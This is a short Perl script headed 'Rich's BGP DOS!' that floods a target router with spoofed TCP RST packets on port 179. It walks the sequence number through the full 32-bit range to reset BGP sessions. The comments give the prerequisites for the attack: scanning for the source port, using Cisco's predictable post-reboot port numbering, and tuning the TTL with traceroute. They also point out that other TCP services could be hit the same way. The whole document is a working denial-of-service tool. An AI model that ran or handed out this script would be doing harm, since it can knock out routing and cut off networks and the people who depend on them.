#!/usr/bin/perl
#
# Rich's BGP DOS!
# version .02
# Sends out RST flood to DOS BGP Connections
#
# Requires getopts.pl and Net:RawIP (http://www.ic.al.lg.ua/~ksv/)
#
#For this to work you must do a preceding scan to figure out what the source port and sequence number should be!
#Cisco routers have a magic source port after reboot and all subsequent source ports are incremented by 1 or 512 depending on IOS
#And also find out the hops to set the ttl w/ traceroute.  Per the RFC, the TTL must be 1 when it arrives at the router.
#
#

require 'getopts.pl';
use Net::RawIP;
Getopts('s:p:d:t:x');
$a = new Net::RawIP;
die "Usage $0 -s <spoofed source> -p <source port> -d <destination> -t <ttl>" unless ($opt_s && $opt_p && $opt_d && $opt_t);

$count=0;

while ($count < 4294967296) {

#Increment the count
                $count=$count + 16384;

#Create IP packet!
                $a->set({ ip => 
                        {saddr => $opt_s,
                        daddr => $opt_d,
                        ttl => $opt_t
                        },
#Another TCP port could be specified here to do DOSes on other TCP services.  BGP is 179
                        tcp=> {dest => 179,
                        source => $opt_p,
                        window =>  16384,
                        seq => $count,
                        rst => 1}
                        });
#Send it out!
                $a->send;
}